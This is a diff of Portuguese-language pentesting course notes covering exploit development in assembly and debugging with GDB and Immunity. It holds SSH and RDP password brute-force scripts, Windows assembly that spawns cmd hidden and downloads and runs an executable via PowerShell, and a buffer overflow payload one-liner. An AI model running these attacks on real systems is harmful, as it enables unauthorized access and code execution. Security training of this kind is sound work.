-                 print ("[+] Senha encontrada ---->",palavra)
+		  if re.search('230', resposta):
 
-                 break
+			 print ("[+] Senha encontrada ---->",palavra)
+
+			 break
 
 
-Script BruteForce em SSH (usando python3)
+- Script BruteForce em SSH (usando python3)
 
-pip install paramiko
+.
 
-#!/usr/bin/python
+	pip install paramiko
 
-import paramiko
+	#!/usr/bin/python
 
-ssh = paramiko.SSHClient()
+	import paramiko
 
-ssh.load_system_host_keys() #ler os known_hosts da lista
+	ssh = paramiko.SSHClient()
 
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Adiciona ao know_host faltante
+	ssh.load_system_host_keys() #ler os known_hosts da lista
 
-f = open ('wordlist.txt')
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Adiciona ao know_host faltante
 
-for palavra in f.readlines():
+	f = open ('wordlist.txt')
 
-        senha = palavra.strip()
+	for palavra in f.readlines():
 
-        try:
+		senha = palavra.strip()
 
-            ssh.connect('172.16.1.5', username='root', password=senha)
+		try:
 
-        except paramiko.ssh_exception.AuthenticationException: # Tratar quando login errado
+		    ssh.connect('172.16.1.5', username='root', password=senha)
 
-            print ("testando com:", senha)
+		except paramiko.ssh_exception.AuthenticationException: # Tratar quando login errado
 
-        else:
+		    print ("testando com:", senha)
 
-            print ("Senha encontrada ---->", senha)
+		else:
 
-            break
+		    print ("Senha encontrada ---->", senha)
 
-                            #stdin, stdout, stderr = ssh.exec_command('ls')
+		    break
 
-                            #for linha in stdout.readlines():
+				    #stdin, stdout, stderr = ssh.exec_command('ls')
 
-                                    #print linha.strip()
+				    #for linha in stdout.readlines():
 
-ssh.close()  
+					    #print linha.strip()
 
-Script BruteForce RDP em Bash
+	ssh.close()  
 
-    for pass in $(cat lista.txt);
+	Script BruteForce RDP em Bash
 
-    do
+	    for pass in $(cat lista.txt);
 
-    echo "Testando senha: $pass"
+	    do
 
-    xfreerdp /u:rgerio /p:$pass /d:gbusiness /v:172.16.1.60
+	    echo "Testando senha: $pass"
 
-    done
+	    xfreerdp /u:rgerio /p:$pass /d:gbusiness /v:172.16.1.60
 
-    DEV EXPLOITATION - ASSEMBLY PARA PENTESTERS WINDOWS
+	    done
+
+## DEV EXPLOITATION - ASSEMBLY PARA PENTESTERS WINDOWS
 
 
 Breve tutorial do ambiente: Instala o DEV CPP e Immunity Debugger, copia o mona para dentro de py no Immunity
 
 Pega o Path do nasm e do dev-cpp a bin e coloca nas configurações avançadas do windows onde troca de nome de usuário para aceitar o comando de qualquer lugar e faz os testes do comando nasm pra ver se ta funcionando.
 
-    Cria um arquivo com o Dev CPP
+- Cria um arquivo com o Dev CPP
+
+.
+
+	#include <stdio.h>
+
+	int main (){
+
+		printf("Information Security");
+
+	}
+
+	    Roda e compila
 
 
-#include <stdio.h>
-
-int main (){
-
-	printf("Information Security");
-
-}
-
-    Roda e compila
+	    Programa em ASSEMBLY
 
 
-    Programa em ASSEMBLY
+	global _main
 
+	section .text
 
-global _main
+	_main:
 
-section .text
+	    NOP
 
-_main:
+	    NOP
 
-    NOP
+	    NOP
 
-    NOP
+	    NOP
 
-    NOP
+	    NOP
 
-    NOP
+	    NOP
 
-    NOP
+	    NOP
 
-    NOP
+	    NOP
 
-    NOP
+	    MOV EAX, 41424344h ;ABCD em hex
 
-    NOP
+	    MOV BX, 4141h
 
-    MOV EAX, 41424344h ;ABCD em hex
+	    MOV CH, 41h
 
-    MOV BX, 4141h
+	    MOV DL, 41H
 
-    MOV CH, 41h
+	    XOR EAX, EAX
 
-    MOV DL, 41H
+	    XOR EBX, EBX
 
-    XOR EAX, EAX
+	    XOR ECX, ECX
 
-    XOR EBX, EBX
+	    XOR EDX, EDX
 
-    XOR ECX, ECX
+Salva em assembly.asm
 
-    XOR EDX, EDX
+	    nasm -f win32 assembly.asm -o assembly.obj 
 
-salva em assembly.asm
+		Cria o executável do assembly
 
-    nasm -f win32 assembly.asm -o assembly.obj 
+	    objdump -d -M intel assembly.obj 
 
-        Cria o executável do assembly
+		Faz um dump do código e mostra na tela. (sem o parâmetro -M intel ele traz o código em AT&T)
 
-    objdump -d -M intel assembly.obj 
+	    golink /entry _main assembly.obj 
 
-        Faz um dump do código e mostra na tela. (sem o parâmetro -M intel ele traz o código em AT&T)
-
-    golink /entry _main assembly.obj 
-
-        Linka o arquivo
+		Linka o arquivo
 
 
 Abrir o arquivo exe com o Immunity e analisar.
@@ -2582,416 +2592,443 @@ New Origin Here Volta para o início do código (Click dir do mouse na linha)
     POP - Tira do topo da Stack
 
 
-    Script em C para Sleep do windows
+- Script em C para Sleep do windows
 
-#include <synchapi.h>
+.
 
-int main(){
+	#include <synchapi.h>
 
-    Sleep(4000);
+	int main(){
 
-}
+	    Sleep(4000);
 
-    Script em assembly Sleep
+	}
 
-global _main
+- Script em assembly Sleep
 
-section .text
+.
 
-_main:
+	global _main
 
-    xor eax, eax
+	section .text
 
-    mov eax, 9000
+	_main:
 
-    push eax
+	    xor eax, eax
 
-    mov ebx, 0x5401AB0 ; Endereço descoberto com o outro código
+	    mov eax, 9000
 
-    call ebx
+	    push eax
 
-    golink /console /entry _main aguardar.obj Kernel32.dll 
+	    mov ebx, 0x5401AB0 ; Endereço descoberto com o outro código
 
-        Cria o executável
+	    call ebx
 
-    arwin Kernel32.dll 
+	    golink /console /entry _main aguardar.obj Kernel32.dll 
 
-        Sleep Pega o endereço da memória sem precisar analisar o código no immunity
+		Cria o executável
 
+	    arwin Kernel32.dll 
 
-    Script em C para cmd.exe do windows
+Sleep Pega o endereço da memória sem precisar analisar o código no immunity
 
-#include <Windows.h>
 
-int main(){
+- Script em C para cmd.exe do windows
 
-    system("cmd.exe");
+.
 
-}
+	#include <Windows.h>
 
-    Script em assembly cmd.exe
+	int main(){
 
-extern system
+	    system("cmd.exe");
 
-global _main
+	}
 
-section .text
+- Script em assembly cmd.exe
 
-_main:
+.
 
-    push 0x00657865
+	extern system
 
-    push 0x2E646D63
+	global _main
 
-    push esp
+	section .text
 
-    pop eax
+	_main:
 
-    push eax
+	    push 0x00657865
 
-    mov ebx, 0x004025F8
+	    push 0x2E646D63
 
-    call ebx
+	    push esp
 
-    golink /console /entry _main cmd-exe-assembly.obj msvcrt.dl 
+	    pop eax
 
-        Linkar o obj gerando o exe
+	    push eax
 
+	    mov ebx, 0x004025F8
 
-    Código assembly Atividade cmd.exe /c calc.exe
+	    call ebx
 
-extern system
+	    golink /console /entry _main cmd-exe-assembly.obj msvcrt.dl 
 
-global _main
+Linkar o obj gerando o exe
 
-section .text
 
-_main:
+- Código assembly Atividade cmd.exe /c calc.exe
 
-    push 0x2E646D63
+.
 
-    push 0x00657865
+	extern system
 
-    push 0x20632F20
+	global _main
 
-    push 0x6578652E
+	section .text
 
-    push 0x636C6163
+	_main:
 
-    push esp
+	    push 0x2E646D63
 
-    pop eax
+	    push 0x00657865
 
-    push eax
+	    push 0x20632F20
 
-    mov ebx, 0x74E54FB0
+	    push 0x6578652E
 
-    call ebx
+	    push 0x636C6163
 
-    Script em C MessageBoxA
+	    push esp
 
-#include <windows.h>
+	    pop eax
 
-int main(){
+	    push eax
 
-	MessageBoxA(0,"Ygor C Developer","From DesecSecurity",1);
+	    mov ebx, 0x74E54FB0
 
-}
+	    call ebx
 
-    Script Assembly MessageBoxA
+- Script em C MessageBoxA
 
-extern _MessageBoxA
+.
 
-global _main
+	#include <windows.h>
 
-section .data
+	int main(){
 
-    texto db "www.desecsecurity.com",0
+		MessageBoxA(0,"Ygor C Developer","From DesecSecurity",1);
 
-    titulo db "keep Learning",0
+	}
 
-section .text
+- Script Assembly MessageBoxA
 
-_main:
+.
 
-    push 0
+	extern _MessageBoxA
 
-    push titulo
+	global _main
 
-    push texto
+	section .data
 
-    push 0
+	    texto db "www.desecsecurity.com",0
 
-    call _MessageBoxA
+	    titulo db "keep Learning",0
 
-    Script ShellExecute em C
+	section .text
 
-#include <windows.h>
+	_main:
 
-int main (){
+	    push 0
 
-	ShellExecute(0, "open", "cmd", 0, 0, 3);
+	    push titulo
 
-}
+	    push texto
 
-    Script ShellExecute Assembly 
+	    push 0
 
-        Usar comando Shell32.dll p/ compilar com golink sem o /console para esconder o shell
+	    call _MessageBoxA
 
+- Script ShellExecute em C
 
-extern _ShellExecuteA
+.
 
-global _main
+	#include <windows.h>
 
-section .data
+	int main (){
 
-    tipo db "open",0
+		ShellExecute(0, "open", "cmd", 0, 0, 3);
 
-    cmd db "cmd",0
+	}
 
-    par db "/c mkdir ygor",0
+- Script ShellExecute Assembly 
 
-section .text
+Usar comando Shell32.dll p/ compilar com golink sem o /console para esconder o shell
 
-_main:
+	extern _ShellExecuteA
 
-    push 0
+	global _main
 
-    push 0
+	section .data
 
-    push par
+	    tipo db "open",0
 
-    push cmd
+	    cmd db "cmd",0
 
-    push tipo
+	    par db "/c mkdir ygor",0
 
-    push 0
+	section .text
 
-    call _ShellExecuteA
+	_main:
 
-    powershell -Command wget https://site.com/donwload/file.exe -Outfile c:/file.exe ; c:file.exe 
+	    push 0
 
-        Executar comando no código assembly para fazer o download e executar o arquivo baixado.
+	    push 0
+
+	    push par
+
+	    push cmd
+
+	    push tipo
+
+	    push 0
+
+	    call _ShellExecuteA
+.
+
+	powershell -Command wget https://site.com/donwload/file.exe -Outfile c:/file.exe ; c:file.exe 
+
+Executar comando no código assembly para fazer o download e executar o arquivo baixado.
 
 Exemplo:
 
-    Script para baixar e executar arquivo com Assembly
+- Script para baixar e executar arquivo com Assembly
 
-extern _ShellExecuteA
+.
 
-global _main
+	extern _ShellExecuteA
 
-section .data
+	global _main
 
-    tipo db "open",0
+	section .data
 
-    cmd db "cmd",0
+	    tipo db "open",0
 
-    par db "/c powershell -Command wget 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -Outfile c:\file.exe ; c:\file.exe ",0
+	    cmd db "cmd",0
 
-section .text
+	    par db "/c powershell -Command wget 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -Outfile c:\file.exe ; c:\file.exe ",0
 
-_main:
+	section .text
 
-    push 0
+	_main:
 
-    push 0
+	    push 0
 
-    push par
+	    push 0
 
-    push cmd
+	    push par
 
-    push tipo
+	    push cmd
 
-    push 0
+	    push tipo
 
-    call _ShellExecuteA
+	    push 0
 
-    DEV EXPLOITATION - ASSEMBLY PARA PENTESTERS LINUX
+	    call _ShellExecuteA
+	    
+
+## DEV EXPLOITATION - ASSEMBLY PARA PENTESTERS LINUX
 
 
     man syscall 
 
-        É basicamente o módulo do sistema responsável por executar os comandos
+É basicamente o módulo do sistema responsável por executar os comandos
 
     unistd_32.h / unistd_64.h 
 
-        Referência para os nomes das Syscalls
+Referência para os nomes das Syscalls
 
-Site que contém essas explicações: syscalls.w3challs.com/?arch=x86 /?arch=x86_64
+[Site que contém essas explicações:](syscalls.w3challs.com/?arch=x86 /?arch=x86_64)
 
     nasm -f alf32 file.asm 
 
-        Cria o arquivo.o
+Cria o arquivo.o
 
     ld -entry _main -m alf_i386 file.o -o file 
 
-        Cria o arquivo executável do linux
+Cria o arquivo executável do linux
 
     nasm -f alf64 file.asm 
 
-        Cria o arquivo.o 64b
+Cria o arquivo.o 64b
 
     ld -entry _main file.o -o file 
 
-        Cria o arquivo executável do linux 64bits
+Cria o arquivo executável do linux 64bits
 
 
-    Script Assembly Linux
+- Script Assembly Linux
 
-global _main
+.
 
-section .data
+	global _main
 
-    curso: db 'Desec Security', 0xa ; pula uma linha
+	section .data
 
-section .text
+	    curso: db 'Desec Security', 0xa ; pula uma linha
 
-_main:
+	section .text
 
-    mov eax, 4 ;tipo de chamada do print
+	_main:
 
-    mov ebx, 1 ;faz parte do print (0.1.2 0.saida.erro) tipo de output
+	    mov eax, 4 ;tipo de chamada do print
 
-    mov ecx, curso ;executa a variável
+	    mov ebx, 1 ;faz parte do print (0.1.2 0.saida.erro) tipo de output
 
-    mov edx, 15 ; tamanho da string
+	    mov ecx, curso ;executa a variável
 
-    int 0x80 
+	    mov edx, 15 ; tamanho da string
 
-    mov eax, 1 ; chama o exit
+	    int 0x80 
 
-    mov ebx, 0 ; envia o parâmetro
+	    mov eax, 1 ; chama o exit
 
-    int 0x80 ; executa
+	    mov ebx, 0 ; envia o parâmetro
+
+	    int 0x80 ; executa
+
+.
 
     gdb -q ./arquivo-exec-comp -tui 
 
-        Arquivo para analisar que foi criado anteriormente (GDB = Immunity debugger)
+Arquivo para analisar que foi criado anteriormente (GDB = Immunity debugger)
 
 
 Comandos do GDB e GDB TUI para Debugger linux
 
     break _main 
 
-        Seta a parada para o _main
+Seta a parada para o _main
 
     run 
-
-        Roda o programa até o momento informado (_main)
+    
+Roda o programa até o momento informado (_main)
 
     info registrers ou i r 
 
-        Mostra os registradores
+Mostra os registradores
 
     disas 
 
-        Mostra o codigo
+Mostra o codigo
 
     set disassembly-flavor intel 
 
-        Colocar a sintaxe para intel
+Colocar a sintaxe para intel
 
     stepi ou si 
 
-        Vai para o próximo passo (f7 do win)
+Vai para o próximo passo (f7 do win)
 
     x/s 0x8012a154 
 
-        Following dump do endereço para examinar o que tem dentro
+Following dump do endereço para examinar o que tem dentro
 
     x/16xw "eip" 
 
-        Para ver o que está no endereço, semelhante ao following dump
+Para ver o que está no endereço, semelhante ao following dump
 
     layout asm 
 
-        Mostra o layout do codigo assembly
+Mostra o layout do codigo assembly
 
     layout regs 
 
-        Mostra os registradores
+Mostra os registradores
 
     c 
 
-        Continue (f7 do breakpoint)
+Continue (f7 do breakpoint)
 
     b* 0x3nd3r3co 
 
-        Break point setar
+Break point setar
 
     LEA 
 
-        Parâmetro que armazena um espaço na memória
+Parâmetro que armazena um espaço na memória
 
     run < < (python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"') 
 
-        Comando para usar no debugger para explorar o programa.
+Comando para usar no debugger para explorar o programa.
 
     python -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"' | ./protegido 
 
-        Exploit do programa protegido usado na aula de buffer no linux
+Exploit do programa protegido usado na aula de buffer no linux
 
 
 EDB Debugger
 
     edb --run program-name 
 
-        Abre o debugger de semelhante modo ao Immunity debugger
+Abre o debugger de semelhante modo ao Immunity debugger
 
 
-    Codigo Assembly em x64 
+- Codigo Assembly em x64 
 
-global _main
+.
 
-section .data
+	global _main
 
-    curso: db 'Desec Security',0xa
+	section .data
 
-section .text
+	    curso: db 'Desec Security',0xa
 
-_main:
+	section .text
 
-    mov rax, 1
+	_main:
 
-    mov rdi, 1
+	    mov rax, 1
 
-    mov rsi, curso
+	    mov rdi, 1
 
-    mov rdx, 15
+	    mov rsi, curso
 
-    syscall
+	    mov rdx, 15
 
-   
+	    syscall
 
-    mov rax, 60
 
-    mov rdi, 0
 
-    syscall
+	    mov rax, 60
+
+	    mov rdi, 0
+
+	    syscall
+
+.
 
     strace ./assembly-x64 
 
-        Faz o monitoramento das chamadas de sistema para saber o que de fato o programa executa
+Faz o monitoramento das chamadas de sistema para saber o que de fato o programa executa
 
     ltrace programa 
 
-        Mostra as library usadas pelo programa informado
+Mostra as library usadas pelo programa informado
 
     ldd programa 
 
-        Verifica também as bibliotecas que o programa tá usando/chamando e verifica se é linkado ou não
+Verifica também as bibliotecas que o programa tá usando/chamando e verifica se é linkado ou não
 
 
     STRCPY,SCANF,GETS 
 
-        São comandos/códigos vulneráveis ao buffer-overflow
+São comandos/códigos vulneráveis ao buffer-overflow
 
 
 Nota: Usar o STRNCPY e informar o numero de chars que fica seguro ou informar no gets o número de bytes permitidos
 
 
-    BUFFER OVERFLOW - WINDOWS
+## BUFFER OVERFLOW - WINDOWS
 
 
 #/usr/bin/python
